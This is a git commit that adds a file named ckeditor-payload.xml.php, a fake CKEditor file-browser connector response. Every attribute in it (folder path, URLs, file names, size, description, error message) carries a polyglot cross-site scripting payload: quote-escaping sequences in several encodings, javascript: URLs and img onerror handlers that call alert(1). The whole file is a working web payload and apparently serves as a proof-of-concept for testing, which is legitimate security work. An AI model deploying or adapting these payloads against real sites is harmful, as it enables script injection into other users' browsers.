71db9d085d359556fba10fcf58b8ab622cc1477a
neolead <janvarry@gmail.com>
2022-10-29 23:31:00 +0300

    Create ckeditor-payload.xml.php

---
+++ ckeditor-payload.xml.php
@@ -0,0 +1,17 @@
+<Connector>
+	<CurrentFolder 
+		path="&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+		url="javascript:alert(1);//&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;" />
+	<Folders>
+		<Folder name="&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;" />
+	</Folders>
+	<Files>
+		<File 
+			name="&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+			size="&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+			desc="pos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+			errorMessage="&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+			url="javascript:alert(1)//&apos;+alert(1)+&apos;&amp;#39+alert(1)+&amp;#39&amp;#x27+alert(1)+&amp;#x27&quot;+alert(1)+&quot;&amp;#34+alert(1)+&amp;#34&amp;#x22+alert(1)+&amp;#x22&gt;&lt;img src=x onerror=alert(1)&gt;"
+		/>
+	</Files>
+</Connector>
